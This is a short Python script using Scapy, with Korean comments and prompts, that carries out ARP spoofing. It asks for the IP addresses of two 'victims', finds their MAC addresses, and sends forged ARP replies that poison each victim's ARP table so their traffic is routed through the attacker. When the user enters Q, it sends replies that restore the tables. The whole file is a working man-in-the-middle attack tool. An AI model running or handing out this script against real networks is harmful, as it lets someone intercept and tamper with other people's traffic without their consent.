from scapy.all import *
from scapy.layers.l2 import Ether, ARP
import sys

def getMAC(ip):
    ans, unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=5, retry=3)
    for s, r in ans:
        return r.sprintf('%Ether.src%')

def attack_ARP(A_ip, B_ip, A_mac, B_mac):
    #A의 ARP 테이블 공격
    arp1 = ARP(op=2, pdst=A_ip, psrc=B_ip, hwdst=A_mac)
    send(arp1)
    #B의 ARP 테이블 공격
    arp2 = ARP(op=2, pdst=B_ip, psrc=A_ip, hwdst=B_mac)
    send(arp2)

def restore_ARP(A_ip, B_ip, A_mac, B_mac):
    #A의 ARP 테이블 복구
    arp1 = ARP(op=2, pdst=A_ip, psrc=B_ip, hwdst=A_mac, hwsrc=B_mac)
    send(arp1)
    #B의 ARP 테이블 복구
    arp2 = ARP(op=2, pdst=B_ip, psrc=A_ip, hwdst=B_mac, hwsrc=A_mac)
    send(arp2)

if __name__ == '__main__':
    A_ip = input("피해자A의 IP 주소: ")
    B_ip = input("피해자B의 IP 주소: ")

    A_mac = getMAC(A_ip)
    B_mac = getMAC(B_ip)

    if A_mac == None:
        print("A의 MAC 주소를 찾을 수 없습니다. A가 활성화되어 있는지 확인하십시오.")
        sys.exit()
    if B_mac == None:
        print("B의 MAC 주소를 찾을 수 없습니다. B가 활성화되어 있는지 확인하십시오.")
        sys.exit()

    print('ARP Spoofing 시작')
    #ARP 테이블 공격
    attack_ARP(A_ip, B_ip, A_mac, B_mac)

    str = input("공격을 마치려면 Q를 입력하세요.")
    if str == 'Q':
        #ARP 테이블 복구
        restore_ARP(A_ip, B_ip, A_mac, B_mac)
        print('ARP 테이블 복구. ARP Spoofing 종료')
        sys.exit()
